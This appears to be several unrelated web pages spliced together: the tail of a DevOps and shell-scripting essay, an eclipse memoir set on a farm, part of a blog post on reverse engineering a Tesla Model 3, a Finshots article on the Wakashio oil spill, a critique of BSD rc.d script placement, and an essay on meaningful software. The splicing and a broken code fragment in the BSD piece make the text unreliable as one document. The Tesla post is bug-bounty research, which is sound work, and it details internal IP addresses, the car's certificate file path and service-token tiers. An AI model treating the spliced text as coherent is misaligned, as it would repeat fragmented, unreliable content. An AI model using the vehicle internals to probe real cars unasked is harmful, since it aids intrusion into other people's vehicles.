critical.</p><h2 id="devops">DevOps</h2><p>Love it or hate it, DevOps has exploded in popularity. DevOps engineers, site-reliability engineers, these kinds of roles may have been unheard of in companies not that long ago and are now becoming ubiquitous.</p><p>In attempting to unify the goals of development and operation of software, DevOps represents an organisational and cultural change. Rather than having one group focus on feature development and another group focus on reliable software operations, a single group is responsible for both. The theory is that this encourages software engineers to also consider security, reliability, maintainability etc, and operators to also consider speed of delivery.</p><p>Regardless of whether teams are genuinely combined, or specialised roles are added to teams, or even if teams are still separated, the lines between development and operations blur somewhat. Software developers are expected to build and plan with knowledge of the execution environment, operators are expected to work with developers to build features which support reliability.</p><p>The intersection of these two roles often is in the realm of automation. Automated deployments after testing, automated failover in case of errors, automated alerting when potential issues are discovered, automated provisioning of environments, automated scaling of systems when load increases.</p><p>The world of automation is intimately linked to the world of the shell and in particular shell scripting. Many tasks which require automation can be easily achieved using shell scripts. Many aspects of modern environments (such as cloud environments) support provisioning and management of services via scripting. In fact, services which <em>cannot</em> be managed via shell scripts or simple interfaces are increasingly becoming obsolete. If it cannot be scripted, it cannot be automated, and the increasingly complex systems we build <em>require</em> automation.</p><p>In practice, this means software engineers are far more likely to have to build shell scripts (or at least understand how to interface with systems via the shell) than they perhaps might have been. Similarly, operators are far more likely to have to <em>program</em> automated routines to manage high availability and so on. Again, the shell and shell scripts are a common way to manage this (even if they are simply entrypoints to more complex systems, such as scripts which execute programs).</p><p>The rise in popularity of DevOps as a set of practices and beliefs has perhaps made the shell more popular, and more important, than any other recent developments in software engineering.</p><p>And for these reasons and many more, learning how to use the shell effectively has never been more relevant or practical.</p></article></div>]]>

				<p><span>The farm dimmed mid-afternoon</span>, dipping into dusk-light. Beside the parked tractors, we passed around a block of green glass from a welder’s helmet and took turns looking through it up at the sky. I chewed a single pebble of a snap pea in my mouth. That was the size of the sun through the glass, I thought, no bigger than a pea, a sliver missing as if chewed by a caterpillar or potato beetle.</p>
				
				<p>In a total solar eclipse, photosynthesis slows down. Plants, which turn to face the sun throughout the day, may change direction, feeling for the light. Without the sun, they become unmoored. Lost in the dark. In the 2017 eclipse, changes in light intensity were attributed to bees going temporarily still. Observers in the path of totality—the stretch of land where the sun goes fully dark—reported fireflies emerging, crickets chirping. Night behavior bleeding into day.</p>
				
				<p>I stared through the glass. Sun the size of a blueberry. Size of a chrysanthemum bud.</p>
				
				<p>We wouldn’t get to see the total eclipse—that dramatic upheaval of the afternoon’s forward march, an ebb when there should be flow. The path of totality was south of us, stretching from Oregon to South Carolina. Still, the light waned at our small farm. Contrast became muted, the sky and hayfields feeling duller, softer. The zinnia patch still sparked with its shocks of red, orange, pink, yellow, but the flowers seemed unsure of themselves. The shadows from the trees did strange things, cast crescent-shaped spells on the ground, reminding me of the light funneled through a dime-store kaleidoscope. Someone arrived with a pair of glasses—the kind made from plastic and cardboard that they’d been selling at gas stations for months, running out in the final few days. We passed them around, but <span>I preferred the welding glass, the way it turned the sliver of sun goblin-green.</span></p>
				
				<p>Sun the size of a kernel of the summer’s first sweet corn; the size of a worm, coiled inside an ear from the later crop, chewing on its silky tassel.</p>
				
				<p>During a total solar eclipse, dairy cows have been known to return to their barn as the sun and sky darken. Orb-weaving spiders have been observed taking down their webs during totality, then rebuilding them <span>when the sun reappears. Some species of birds will sing out their night calls,</span> then go to their roosts, falling silent; when the sun reappears, they start their morning rituals. In this sense, the eclipse is a microcosm of night, the dark sped up, the hour hand spinning around a clock at a horse’s trot.</p>
				
				<p>Sun the size of a pepper seed. Size of a flea beetle. A ladybug resting on a windowsill. A thistle bur stuck to a coat.</p>
				
				<p>There is no evidence that an eclipse affects the behavior of horses, but nevertheless, there will be some owners who usher them into the safety of the barn before the sky goes dark. This is a form of love which happens to involve a kind of captivity.</p>
				
				<p>Sun the size of a nostril, size of a belly button, a baby’s tooth, a fingertip. Size of the chunk of flesh I’d sliced off the top of my thumb one day when I was careless with a head of cauliflower. It bled so much and so steadily that I ran to the back of the farm stand where someone sat me down on a bench to bandage the cut. I remember they held my hand so carefully, tilting it one direction then the other, saying twice, maybe three times, <i>You need to be more careful</i>.</p>
				
				<p>Once we’d passed around the glass, we scattered to our different jobs. I drove back to the snap pea patch, where I continued filling a bucket with round, ripe pods. I heard a tractor starting, the exhaust clearing its throat, then watched from where I was crouched as someone connected a hay rake to the back and pulled back onto the road, headed for one of the higher fields, leaving a cloud of dust and acres of silence behind. I realized then that the birds, which were usually a constant chorus, had gone quiet—the small snapping of my hands plucking peas from their vines, the only noise that reached me. I stood, stretching, and looked at the sky, the familiar fields—their flat, muted light. I stood there looking at the farm that for years I had grown to know and care for, and I thought of scale—of how the land surrounding me had come to feel like it was my own body, a breathing, pulsing creature that could weep or swell; and, at the same time, how the land felt unthinkably large—a roaring sun—the weight of it and of the people who worked it reaching deep into the smallest cracks and crevasses of my life like the tendrilled arms of solar flares bursting.</p>
				
				<p>I thought of all of this as I rolled another snap pea over my tongue, biting down, tasting the small eruption of green. Then I bent down, knees to dirt, to finish my work.</p>

    <p><em>See the follow up at <a href="https://fn.lc/post/tesla-model-3-services/">Hacking my Tesla Model 3 - Internal API</a>.</em></p>
<p>I recently got a Tesla Model 3 and since I’m a huge nerd I’ve been spending a
lot of time poking at the systems and trying to reverse engineer/figure out how
to root my car.</p>
<p>I work on Machine Learning infrastructure so I’d love to be able to take a deep
look at how autopilot/FSD works under the hood and what it can actually do
beyond what limited information the UI shows. I know some people have managed to
get a copy of this.</p>

<h2 id="existing-research">Existing Research</h2>
<p>A lot of the existing knowledge about the internal systems are specific to the
older Model S cars since their security is pretty non-existent. The Model 3 (and
presumably the newer Model S/X/Y) has numerous layers of security measures. The
high level architecture is fairly similar but has been hardened a lot.</p>

<p>Before I touched my car at all, I registered as part of the Tesla bug bounty
program and my car is a research-registered vehicle. If you’re interested in
poking at your car at all, I’d highly recommend registering as Tesla will try to
fix it if you brick your car.</p>
<blockquote>
<p>If, through your good-faith security research, you (a pre-approved, good-faith
security researcher) cause a software issue that requires your
research-registered vehicle to be updated or “reflashed,” as an act of
goodwill, Tesla shall make reasonable efforts to update or “reflash” Tesla
software on the research-registered vehicle by over-the-air update, offering
assistance at a service center to restore the vehicle’s software using our
standard service tools, or other actions we deem appropriate.</p>
</blockquote>

<h2 id="internal-layout-of-the-car">Internal Layout of the Car</h2>
<p>All of the higher level components are connected via an internal Ethernet
switch. These include:</p>
<ul>
<li>cid/ice - this is the computer that controls the display and all of the media
systems such as sound.
<ul>
<li>192.168.90.100</li>
</ul>
</li>
<li>autopilot primary and secondary computers.
<ul>
<li>192.168.90.103 - ap/ape</li>
<li>192.168.90.105 - ap-b/ape-b</li>
</ul>
</li>
<li>Gateway - this is primarily UDP server that controls the switch, vehicle
config and proxies requests between the ethernet side (cid/autopilot) and the
<ul>
<li>192.168.90.102
CAN BUS to the motor controllers and sensors.</li>
</ul>
</li>
<li>Modem - this is the LTE modem
<ul>
<li>192.168.90.60</li>
</ul>
</li>
<li>Tuner - this is for the AM/FM radio. Not present on the newer Model 3 cars
including mine. Not having an AM/FM radio does seem like a safety issue so I
was surprised to see it was removed.
<ul>
<li>192.168.90.60</li>
</ul>
</li>
</ul>
<h2 id="seceth---secure-ethernet-tcam">seceth - Secure Ethernet TCAM</h2>
<p>The internal car network appears to be using a Marvel 88EA6321 as a switch. This
is an automative gigabit switch.</p>
<p>Most of the connections are using 100BASE-T1 which is a 2 wire PHY for ethernet.
The autopilot computers, modem, tuner, gateway, CID all use 100Base-T1. There’s
two standard ethernet ports. One is located on the CID motherboard and has a
standard ethernet jack. The other is located in the driver side footwell and has
a <a href="https://teslaownersonline.com/threads/ethernet-port-in-driver-footwell.15045/">custom connector</a>.</p>
<h3 id="dsa">DSA</h3>
<p>The switch appears to be using something called <a href="https://www.kernel.org/doc/Documentation/networking/dsa/dsa.txt">Distributed Switch
Architecture</a>
and TCAM.</p>
<p>DSA allows the switch to be controlled by a separate processor. In the
Model 3, I believe the Gateway controls it. I haven’t seen any references to the
Linux dsa subsystem in the CID.</p>
<h3 id="tcam">TCAM</h3>
<p>TCAM is a special type of memory that can do very fast lookups/filters in a
sincel cycle. This allows for the Gateway to specify packet filters for the
switch to apply. By default the ethernet port in the driver side footwell is
disabled by these rules. The diagnostic jack on the CID motherboard can only
access port 8080 (Odin) and 22 (SSH) on the CID.</p>
<p>There is a way to disable the secure ethernet but this seems to be only
accessible via Odin by Tesla engineering and possibly service.</p>
<p>There’s apparently a daily changed code that unlocks the diagnostic
port/service mode. Service likely has to get this from Tesla via Toolbox.</p>
<h2 id="hermes---talking-to-the-mothership">Hermes - Talking to the Mothership</h2>
<p>The older Model S cars use a persistent OpenVPN connection to communicate with the
“mothership” as Tesla refers to it. All communication with Tesla go through this
VPN connection so there’s no way to sniff any of the updates.</p>
<p>Instead of using OpenVPN, the Model 3 runs a proxy service called Hermes. Hermes
is a relatively simple service that can proxy unauthenticated requests on the
CID to the mothership. Presumably maintaining persistent OpenVPN connections on
500,000+ cars wasn’t scalable so they switched to a lower overhead solution.</p>
<p>Hermes also allows Tesla to make requests to the car itself and fetch logs from
it. Presumably this is how Tesla can enable features such as Full Self-Driving
over the air without a full software update as well as do remote service.</p>
<h3 id="certificates">Certificates</h3>
<p>Every car is issued unique client certificates for Hermes/OpenVPN and they’re
periodically rotated. This makes it quite hard to do things like grabbing
firmware images or inspect Tesla’s backend since you first have to get root
access to a car.</p>
<p>These certificates live under <code>/var/lib/car_creds/car.{crt,key}</code>.</p>
<pre><code># Phone Home connects to devices over Hermes based on the
# Hermes certificate CN.
...
#     subject=
#     CN=BANGELOM300000001
#     OU=Tesla Motors
#     O=Tesla
#     L=Palo Alto
#     ST=California
#     C=US
</code></pre><p>Each car is issued a specific common name that’s only accessible internally to
make it harder for attackers to try and fake a cert. This is relevant for SSH as
we’ll see later.</p>
<h3 id="binaries">Binaries</h3>
<p>There’s a bunch of different hermes binaries. They all seem to be written in
<em>Go</em> :). It’s nice to see my favorite programming language running in my car.</p>
<pre><code>$ ls opt/hermes/
hermes_client*     hermes_fileupload*  hermes_historylogs*  hermes_teleforce*
hermes_eventlogs*  hermes_grablogs*    hermes_proxy*

$ file /opt/hermes/hermes_client
opt/hermes/hermes_client: sticky ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=JRZRLflVY89A6p67rwkt/nb9KmeWMLadrBGvRVujH/aJPtciQz8Xldpa7VcVy_/XzIY9KY7sZI0KdwLYOK5, stripped
</code></pre><p>It’s pretty easy to see what OSS libraries they’re using in the binary by using
<code>strings hermes_client | rg vendor/</code>. Maybe I’ll make a follow up post analyzing
Hermes itself.</p>
<h2 id="odin---service-interface">Odin - Service Interface</h2>
<p>Odin is a python 3 service running on every car. It’s used for various
maintenance actions on the car such as calibrating the radar and the cameras. If
you connect to the internal car network you can access it at
http://192.168.90.100:8080.</p>
<p>There’s a screenshot of this interface at <a href="https://github.com/lewurm/blog/issues/4">https://github.com/lewurm/blog/issues/4</a></p>
<p>If you try to run any of the actions on Odin it just throws an error.</p>
<h3 id="odin-authentication">Odin Authentication</h3>
<pre><code>{error: "Token 2.0 not found."}
</code></pre><p>I dug into the source code.</p>
<p><em>Tesla uses signed certificates for everything.</em></p>
<p>From a security perspective this is amazing. :) From a “I want to get root on my
car” perspective it’s awful. :(</p>
<p>Each token contains a security level. These levels grant access to different
Odin commands. This allows different tiers of service the minimum permissions
they need to do their job.</p>
<p>These are broken into <code>principals</code> and <code>remote_execution_permissions</code>.
Presumably <code>principals</code> requires physical access via the diagnostic ethernet
port.</p>
<p>The <code>principals</code> levels listed in the Odin tasks are:</p>
<ul>
<li>tbx-internal</li>
<li>tbx-external</li>
<li>tbx-technical-specialist</li>
<li>tbx-engineering</li>
<li>tbx-service</li>
</ul>
<p>These seem to be mostly internal car tests likely used during manufacturing.
The only time the non internal/external principals show up is for
<code>PROC_ICE_X_LOGS-UPLOADER</code> and <code>ICE_DEASSOCIATE_PRODUCT_ID</code>. The second is
engineering only and appears to wipe the vehicle VIN and car config.</p>
<p>The <code>remote_execution_permission</code> levels listed in the Odin tasks are:</p>
<ul>
<li>tbx-service</li>
<li>tbx-service-infotainment</li>
<li>tbx-technical-specialist</li>
<li>tbx-service-engineering</li>
<li>tbx-engineering</li>
<li>tbx-mothership</li>
</ul>
<p>Things like <code>TEST-BASH_ICE_X_SEARCH-UI-ALERTS</code> can be accessed by <code>tbx-service</code>,
<code>tbx-service-engineering</code> and <code>tbx-mothership</code>.</p>
<p>Things like <code>PROC_ICE_X_SET-VEHICLE-CONFIG</code> can only be accessed by
<code>tbx-mothership</code>.</p>
<p>The token’s are signed by an intermediate certificate. This intermediate
certificate public key is included as part of the token and signed by Tesla’s
root CA. From my understanding this follows standard security practices of web
CAs to prevent the root certificate from being compromised.</p>
<h3 id="odin-networks">Odin Networks</h3>
<p>Odin is implemented in a pretty interesting way. There’s a list of <code>tasks</code> and
<code>networks</code>. The tasks are high level actions that can be executed by someone
with specific permissions.</p>
<p>The <code>lib</code> files are “networks” that appear to be a domain specific language/UI
program just for creating service tasks.</p>
<p>The networks are very close to JSON but stored in <code>.py</code> files.</p>
<p>Here’s an excerpt of one:</p>

                    <p><em>A few days ago, a cargo vessel MV Wakashio ran aground off Pointe d’Esny, on the south-east coast of Mauritius and started spilling oil.</em></p><p><em>Needless to say, we need to talk about it.</em></p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="the-story">The Story</h3><p>Imagine thousands of gallons of oil pouring into a water body somewhere along the coast of a small island nation. Your first order of business is to contain and clean up the spill — in that order specifically.</p><p>Because when oil does spill, it forms a thick film that floats on top of the water body slowly spreading out and thinning as time progresses. More time means more coverage area. More coverage means a more elaborate cleanup effort. So in theory, if a cleanup crew can reach a spill quickly, they could contain it more efficiently and reduce costs across the board.</p><p>With the MV Wakashio oil spill, things didn’t exactly go as planned. The ship <a href="https://gcaptain.com/wakashio-breached-oil-leaks-from-grounded-bulk-carrier-in-mauritius-police-investigation-launched/#:~:text=The%20Indian%20Ocean%20island%20nation,Brazil%20via%20Singapore%20on%20ballast.">struck</a> a reef on July 25th and its body began to crack after days of pounding waves. At the time, the Mauritius government could have averted the crisis altogether by emptying the ship of its fuel. But that did not happen. Instead, the ship kept taking the beating and finally started leaking fuel on August 6th. Now the ship’s owners contest that oil prevention measures were in place by then. But clearly, it wasn’t helping a lot.</p><!--kg-card-begin: image--><figure><img src="https://d3jlwjv6gmyigl.cloudfront.net/images/2020/08/5f2bf41a78a54_wakashio_ecosud-1443924.jpg"><figcaption><a href="https://la1ere.francetvinfo.fr/reunion/naufrage-du-wakashio-il-y-breche-fuite-huile-859552.html">Source: France Info</a></figcaption></figure><!--kg-card-end: image--><p>The Mauritius government could have taken some initiative here. But they waited for a whole day before finally taking stock of the situation and <a href="https://www.bbc.com/news/world-africa-53702877#:~:text=The%20island%20nation%20of%20Mauritius,and%20its%20crew%20was%20evacuated.&amp;text=The%20French%20island%20of%20Reunion%20lies%20near%20Mauritius%20in%20the%20Indian%20Ocean.">declaring emergency</a> late on Aug 7th. Thankfully the people of Mauritius stepped up. As an article in the New York Times <a href="https://www.nytimes.com/2020/08/14/world/africa/mauritius-oil-spill.html">notes</a> —</p><blockquote><em>“Immediately after the accident, individuals, civil society organizations and environmental groups mobilized to save the mangrove forest and coral reefs that give Mauritian waters their rich biodiversity.<p>Thousands of volunteers pulled all-nighters gathering plastic bottles and skimming oil into barrels, while salons donated hair and <a href="https://www.instagram.com/p/CDt2gpzg133/?igshid=1uidpqls8erlm" rel="noopener noreferrer noopener">children collected straw</a> from fields to help soak up the oil. Mauritians abroad began <a href="https://www.instagram.com/savemauritiusreef/" rel="noopener noreferrer noopener">social media campaigns</a> to raise awareness, and hundreds of thousands of dollars <a href="https://www.crowdfund.mu/mauritius-oil-spill-cleaning-2020-mv-wakashio-306.html" rel="noopener noreferrer noopener">were collected</a> on fund-raising platforms.”</p></em></blockquote><p>However, despite the collective effort, the size of the oil slick had already <a href="https://twitter.com/UrsaSpace/status/1293587048344047621?s=20" rel="noopener">expanded 10x</a> within just one week and the cleanup effort could now take months costing the shipping company and the Mauritius government millions of dollars.</p><p>How many millions? That’s difficult to calculate.</p><p>The Exxon Valdez case— a spill of approximately 10.8 million gallons in Alaska in 1989 cost <a href="https://media.rff.org/archive/files/sharepoint/WorkImages/Download/RFF-BCK-Cohen-DHCosts_update.pdf">$2.1 Billion</a> (in cleanup efforts). The MV Wakashio, on the other hand, was only carrying ~127,000 gallons of oil. The reason for the disparity — Exxon Valdez was a cargo ship ferrying oil. Wakashio was an empty ship travelling to pick cargo. The leak was from the fuel tank and the oil it was carrying to propel the vessel. Also, the cleanup team emptied the ship of its fuel before everything could spill out. So it’s safe to say the cleanup effort won’t cost billions.</p><p>But the impact will probably be severe either way.</p><p>Beyond the cleanup costs, we also have to contend with the ecological devastation that almost inevitably follows. Four years after the Exxon Valdez spill, a population of forage fish called herring <a href="https://www.history.com/topics/1980s/exxon-valdez-oil-spill">disappeared</a> entirely from the location where the vessel broke. Scientists still aren’t sure why this happened. They can’t even ascertain fully if the oil spill was to blame. But the impact of this disappearance was catastrophic. It spelt the death of an 8-million-dollar-a-year fishery industry. Although most fishermen never explicitly sought herrings, these small forage fishes are preyed on by larger fish for food. Once the population of herrings collapsed, it left a gaping hole in the middle of the marine food chain. 25 years later, herrings are yet to return and the fishery industry has all but vanished.</p><p>With the Wakashio oil spill, we have the same concerns. Blue Bay — The place where the ship ran aground was <a href="https://www.bloombergquint.com/opinion/why-mauritius-oil-spill-is-a-very-big-problem-for-the-oil-industry">declared</a> a marine park back in 1997. It’s perhaps one of the last remaining areas which still harbours undamaged coral reefs and an abundance of underwater life. The oil spill might have spelt the death of the ecological balance in the area. What will it cost the local population? We don’t know yet. But it’s a tragedy that we still have to contend with oil spills this day and age.</p><p>Share this Finshots on <a href="https://api.whatsapp.com/send?text=What%20happens%20when%20there%27s%20an%20oil%20spill?%20https://bit.ly/3llY8AL">WhatsApp</a>, <a href="https://twitter.com/intent/tweet?url=https://bit.ly/3jdaCsa&amp;via=finshots&amp;text=What%20happens%20when%20there%27s%20an%20oil%20spill?">Twitter</a>, or <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://finshots.in/archive/the-economic-cost-of-oil-spills">LinkedIn</a>.</p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="an-inside-scoop">An Inside Scoop</h3><p>A few days back we wrote about the legal battle brewing between Apple and Epic Games.

            <div>
              
              <article>

<p>Let’s open with the controversy: the scripts that live under <code>/etc/rc.d/</code> in FreeBSD, NetBSD, and OpenBSD are in the wrong place. They all should live in <code>/libexec/rc.d/</code> because they are code, <em>not</em> configuration.</p>

<p>This misplacement is something that has bugged me for ages but I never had the energy to open this can of worms back when I was very involved in NetBSD. I suspect it would have been a draining discussion and a very difficult thing to change.</p>

<p>But… what am I talking about anyway?</p>

<p>If you have administered a BSD system, you have certainly encountered the <code>/etc/rc.d/</code> directory; and if you have administered pre-systemd Linux systems, you have dealt with <code>/etc/init.d/</code>. These directories contain startup scripts to configure the system at boot time and are immutable. Their code is parameterized to allow changing their behavior via configuration files, not via code edits. And that’s the base of my critique.</p>

<p>But before getting into why the current state is problematic and how things should look like, let’s first dig into how we got here. And, for that, we need to go back in history.</p>



<p>4.4BSD’s (1993) boot process was rather simple: the kernel started <code>init</code> which in turn ran the <code>/etc/rc</code> script before starting <code>getty</code> on each console. The <code>/etc/rc</code> monolith was in charge of configuring the machine’s file systems and processes, and delegated to two other scripts: <code>/etc/netstart</code> for network configuration and <code>/etc/rc.local</code> for locally-added services. Current BSD systems are more advanced in this area as we shall see later, but the core boot process remains the same: <code>/etc/rc</code> is the primary entry point and bootstraps a collection of shell scripts.</p>

<p>In the early days, package management and file provenance tracking, like we are used to having in popular Linux distributions, was not a thing. You were expected to tune the systems’ behavior by <em>editing</em> files which might or might not have been designed to support edits. If you had to edit <code>/etc/rc</code>, which was a script shipped by the system, that was alright.</p>

<p><code>/etc/rc.local</code>, on the other hard, was <em>not</em> shipped by the system, and it was up to you to create it if you wanted to add custom startup commands without modifying <code>/etc/rc</code>. And this is where things get interesting. <code>/etc/rc.local</code> didn’t need to be supported: if you were expected and able to edit <code>/etc/rc</code> anyway, why would you deal with a separate file? The reason is, most likely, to simplify system upgrades: during an upgrade, you want to benefit from any upstream changes made to <code>/etc/rc</code> (some of which might actually be <em>necessary</em> for proper system operation). Applying updates to a manually-modified file is tricky, so putting as many of your manual overrides into <code>/etc/rc.local</code> helped minimize this problem.</p>



<p>System V 4 (SVR4, 1988) also came with its own, and very different, boot process. The key difference was that System V had the concept of runlevels. As a result, configuring the boot process was a more convoluted endeavour because it was possible to select different services per runlevel.</p>

<p>To accomplish per-runlevel tuning, the system used <a href="https://jmmv.dev/2020/08/config-files-vs-directories.html">configuration directories rather than files</a>: there was a separate <code>/etc/rcX.d/</code> directory for each runlevel (where <code>X</code> was the number of the runlevel), and these directories contained one file per action to take at startup time. To avoid duplicates, these files were just symlinks to common files under <code>/etc/init.d/</code>—and the symlinks, not their targets, were named so that their lexicographical order determined startup execution order.</p>

<p>Once again, we can already observe issues here: the symlinks under <code>/etc/rcX.d/</code> <em>are</em> configuration because their presence indicates what to start and their names determine their startup order. But the files under <code>/etc/init.d/</code> are <em>not</em>: they are shell scripts shipped with the system and should not be manually modified.</p>



<p>NetBSD <a href="http://www.mewburn.net/luke/papers/rc.d.pdf">modernized the boot process</a> in its 1.5 release (2000), and it did so in two ways: first, it introduced <code>/etc/rc.d/</code> as a directory to contain separate scripts per action and service; and, second, it introduced <a href="https://netbsd.gw.com/cgi-bin/man-cgi?rcorder+8+NetBSD-9.0-STABLE">the <code>rcorder(8)</code> tool</a> to determine the order in which these services run. <code>rcorder(8)</code> uses dependency information encoded in the scripts as comments—not lexicographical ordering as System V did. FreeBSD <a href="https://www.freebsd.org/cgi/man.cgi?query=rc&amp;apropos=0&amp;sektion=8&amp;manpath=FreeBSD+12.1-RELEASE&amp;arch=default&amp;format=html">inherited this design</a> in its 5.0 release (2003) and OpenBSD reimplemented something similar in its 4.9 release (2011).</p>

<p>With these two pieces in place, the <code>/etc/rc</code> script in NetBSD and FreeBSD changed to execute all files from <code>/etc/rc.d/</code> based on the output of <code>rcorder(8)</code>. Among these scripts is <a href="https://github.com/NetBSD/src/blob/8f8c6d6b2a8778b653d9630f3f18e057b477a012/etc/rc.d/local"><code>/etc/rc.d/local</code></a>, whose purpose is to run <code>/etc/rc.local</code> if it exists. And that’s all, really. The <code>/etc/rc</code> script thus became <a href="https://github.com/NetBSD/src/blob/8f8c6d6b2a8778b653d9630f3f18e057b477a012/etc/rc">trivial</a>.</p>

<p>The key thing to notice here is that the scripts shipped in <code>/etc/rc.d/</code> are <em>highly configurable</em> via the user-controlled <a href="https://github.com/NetBSD/src/blob/8f8c6d6b2a8778b653d9630f3f18e057b477a012/etc/rc.conf"><code>/etc/rc.conf</code></a> file. This essentially makes the scripts read-only, as it shifts local customizations to the configuration file. <em>System administrators are not supposed to edit the scripts.</em> Instead, they are supposed to: modify <code>/etc/rc.conf</code> to customize what gets run and how; add new scripts under <code>/etc/rc.d/</code> if they so choose; and edit <code>/etc/rc.local</code> to easily run arbitrary commands.</p>



<p>My main gripe is that the files under <code>/etc/rc.d/</code> are immutable scripts. They do not belong in <code>/etc/</code> and their presence there makes system upgrades harder for no good reason.</p>

<p>You see: in NetBSD and FreeBSD, system upgrades happen by unpacking new distribution sets in the root directory and then running a script to incorporate configuration updates. This script is interactive and helps highlight how new system-provided updates to configuration files conflict with previous manual edits. (This process might seem rudimentary to you, but it’s actually pretty robust and easy to understand—and you can use tooling like <a href="https://github.com/jmmv/sysupgrade/">sysupgrade</a> to make it trivial.)</p>

<p>So why is that a problem? Because you will <em>always</em> face merges like this:</p>

What do you want to do? [Leave it for later]
</code></pre></div>
<p>And, really, who cares? Why are you being distracted to review a <em>code</em> change when what you are trying to do is assess <em>configuration</em> conflicts? How many times have you actually objected to these merges?</p>

<p>You might say: well, I want to know <em>exactly</em> how the boot process of my machine changes during an upgrade. Sure, that’s a fine goal, but then this procedure is flawed and completely insufficient to achieve such goal. In the example above, whatever <code>/etc/rc.d/npf</code> does can also be done from within the <code>/sbin/npfctl</code> binary it invokes… and you were never asked to review changes to the latter during an upgrade, were you? And <em>of course</em> you could review the binary’s code as part of your own system build, but if you did that, then you could have reviewed the startup script as well, right?</p>



<p>Startup scripts provided by the system need to live in a location that can contain executables—but we don’t want those executables to show up in the <code>PATH</code>. These requirements discard <code>bin</code> and <code>sbin</code>, and points us towards <code>libexec</code> on BSD systems and somewhere under <code>lib</code> on Linux.</p>

<p>Therefore, the read-only startup scripts should move from <code>/etc/rc.d/</code> to <code>/libexec/rc.d/</code> (which, by the way, also applies to <code>/etc/rc</code>, <code>/etc/rc.subr</code>, and <code>/etc/rc.shutdown</code>). And that’s it. <del><code>/etc/rc</code></del> <code>/libexec/rc</code> should continue to use <code>rcorder(8)</code> to check what’s needed to run, but it should read files from <code>/libexec/rc.d/</code>. You might even want to support a separate location for user-created services, which might still be <code>/etc/rc.d/</code> or, better yet, a more fitting location like <code>/usr/pkg/libexec/rc.d/</code> (though that quickly runs into problems if you have multiple file systems).</p>

<p>With this design, system upgrades would be much saner because the configuration merge process would focus, purely, on actual configuration changes and not on irrelevant code changes. All updates to <code>/libexec/rc.d/</code> would be applied by unpacking the new distribution sets (<code>base.txz</code> in this case) without disturbing you about how exactly they changed.</p>

<p>Does this relate to Linux distributions at all? I briefly mentioned <code>/etc/init.d/</code> at the beginning, and the problem there is similar. But it’s also an obsolete problem given that Linux distributions have moved onto systemd by now. That said, systemd still has to manage individual services and, like it or not, has gotten this right. If we look at the <a href="https://www.freedesktop.org/software/systemd/man/systemd.unit.html"><code>systemd.unit(5)</code></a> manual page, which describes where units are loaded from, the system first looks into various <code>/etc/</code> and <code>/run/</code> directories, but then also looks at <code>/usr/lib/systemd/system/</code> (a read-only location correctly controlled by the package manager)—and the vast majority of the scripts live inside the latter.</p>



<p>I currently don’t run BSD systems any more so my incentives to make this happen are low… but if this all makes sense and is something you’d like to pursue, by all means please do! I’m happy to help …</p></article></div></div></div>

<p><strong>Surprise! Delivering valuable software is difficult.</strong> (Ok.. maybe not that surprising.)</p>



<div><p>Maybe it started out well – but over time it grew stale. Or it was wrong from the very beginning. Despite the common belief that software is an asset – it’s just as easily a liability.&nbsp;</p><p>Let’s start with how do you define “Meaningful” software? Developers know when something they are working on doesn’t matter. Sometimes the indicator is a lack of interest in investing further or it’s heavy investment in something that gets little usage. Either way meaningful software must be a win-win for both creator and consumer.</p></div>



<p><strong>“Meaningful software delivers value to a substantial segment of the target user group and </strong><strong>directly</strong><strong> supports the goals and objectives of those delivering the software. “</strong></p>



<p>I’ll argue that any software feature or platform that fulfills this criteria will produce positive results. I’ll also suggest that it can be challenging to achieve and maintain this balance.</p>



<blockquote><p>Example 1: <em>“Hey – we should build our own shopping cart system”</em></p></blockquote>



<p>If you are competing against Amazon in the high volume retail market and need proprietary AI recommendation systems – then it’s a worthy investment. If you are selling flowers at the corner market, probably not. It sounds simple on the surface but the question you always need to ask is: will it give me a competitive advantage and help me directly achieve my goals?</p>



<blockquote><p>Example 2: <em>“Hey, power user X says they would love this feature”</em></p></blockquote>



<p>Power users and early adopters are extremely valuable. But it’s important that you obtain and test feedback against a larger market. Investing in a feature that is utilized by a few users doesn’t contribute to growth. Will it deliver value to a large portion of my target users?</p>



<h2>Why is this important?</h2>



<p><strong>Software that isn’t meaningful isn’t sustainable</strong>.<br>If it doesn’t meet the objectives of its creators, they should be building something else.&nbsp; If it doesn’t deliver value to a substantial number of target users then they don’t really need it or should be using something else.&nbsp; When one or both of these conditions have not been met it creates an imbalance that generally results in a slow painful death for the platform.</p>



<p><strong>Software that isn’t meaningful creates unnecessary costs for its creator.</strong> This takes many forms – time, opportunity, and financial cost. The long term impact of holding meaningless software with active users is dangerous because its toxic byproducts are usually hidden in the depths of technical teams.&nbsp; If your are interested in learning more about the costs associated with building features, <a href="https://productcoalition.com/the-real-cost-of-adding-a-new-feature-9d527448df41">this is a great article</a> that highlights the risks.<br>&nbsp;</p>



<p><strong>Software that isn’t meaningful disrupts focus on key objectives.</strong> It creates confusion, takes over meetings, hurts morale, and ultimately can derail strategic direction. The real danger of meaningless software is it appears to be “low hanging fruit” and usually brings a level of comfort that attracts all sorts of “feature requests” and “ideas”.&nbsp; If the creators lose sight of its intended purpose then the strategic objective quickly shifts from whatever it was originally to the ambiguous effort of making the software “better”. <br>&nbsp;</p>







<div><p><strong>Mastering the ability to distinguish meaningful from meaningless requires discipline.</strong> You have to be honest with yourself and objective about what it is you are producing.&nbsp; You cannot fall in love with your creation. You have to be willing to refactor design, listen to concerns, take time to organize, reject tradition, kill exciting (but distracting) ideas, and ignore the urge to “make things” right without purpose.&nbsp; It requires focus and it requires constant re-evaluation. It’s uncomfortable – but once you know you are building something that matters – it all clicks.</p><p><strong>Shaping software into something meaningful requires thinking holistically.</strong>&nbsp;  Understanding the goals of stakeholders, needs of target users, cost of building, validation techniques, and methods of promotion are just as important as the mechanics of how the software functions. Alignment and positioning of effort is key to the  “meaningful” attribute of the art.</p></div>



<p><strong>Producing meaningful software requires a fundamental understanding of how software is created, tested, and distributed.</strong> It’s also not enough to make plans and collaborate with stakeholders – it’s very important to understand capabilities, risks, and mechanics of how software is made and maintained. You don’t have to be a developer to deliver meaningful software, but you do need to know how to communicate with one. Mastering this is how the “delivery” happens.</p>







